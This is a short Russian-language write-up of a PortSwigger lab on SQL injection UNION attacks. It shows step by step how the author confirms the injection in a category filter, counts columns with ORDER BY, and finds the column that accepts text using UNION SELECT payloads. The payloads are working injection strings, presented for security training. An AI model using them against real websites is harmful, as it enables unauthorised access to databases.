# SQL injection UNION attack, finding a column containing text

## Scope

[ссылка на лабу](https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-finding-columns-with-a-useful-data-type/sql-injection/union-attacks/lab-find-column-containing-text)

```
https://0ae10098047afc77a0e79a58006d0024.web-security-academy.net/
```

В данной лабе есть уязвимый к `SQL injection` фильтр категории.

Нужно найти столбец, в котором используются строки.

## Notes

Из задания известно, что `sqli` находится в фильтре категории, поэтому возьму `URL` и буду работать с ним:

```
https://0ae10098047afc77a0e79a58006d0024.web-security-academy.net/filter?category=Accessories
```

Теперь нужно найти обрамление параметра. Предположу, что запрос в БД Выглядит следующим образом:

```SQL
SELECT * FROM table WHERE category = 'Accessories'
```

Поверю это, передав следующий пейлоад:

```
Accessories' and false-- -
```

Товары не отобразились, значит я нашел обрамление. 

![](../images/Pasted%20image%2020250118184731.png)

Далее найду количество колонок с помощью `ORDER BY`:

```
Accessories' ORDER BY 4-- -ошибка
Accessories' ORDER BY 3-- -ОК
```

Значит у меня 3 колонки. Подставлю `UNION`, чтобы вывести свои данные на страницу:

```
Accessories' UNION SELECT NULL, NULL, NULL-- -ОК
```

Подставлю свои данные вместо `NULL`:

```
Accessories' UNION SELECT NULL, NULL, NULL-- -
```

Только сейчас заметил, что нужно вывести определенную строку) Ну ок.

![](../images/Pasted%20image%2020250118185254.png)


```
Accessories' UNION SELECT 'xCxqZ9', NULL, NULL-- -ошибка
Accessories' UNION SELECT NULL, 'xCxqZ9', NULL-- -ОК
```

![](../images/Pasted%20image%2020250118185426.png)

Лаба решена:3